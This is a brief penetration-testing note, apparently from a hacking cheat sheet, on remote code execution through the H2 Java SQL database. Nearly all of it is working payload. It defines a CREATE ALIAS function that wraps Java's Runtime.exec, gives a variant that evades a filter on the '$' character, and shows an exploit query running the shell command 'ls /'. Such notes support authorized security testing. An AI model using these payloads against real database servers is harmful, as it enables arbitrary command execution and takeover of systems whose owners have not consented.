# H2 - Java SQL database

Note for H2 RCE.

# Create EXECVE Alias

```
CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : "";  }$$;
```

Bypass `$` payload: 

```
CREATE ALIAS EXECVE AS (SELECT 'String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : "";  }' FROM dual);
```


# Exploit 

```
SELECT EXECVE('ls /')
```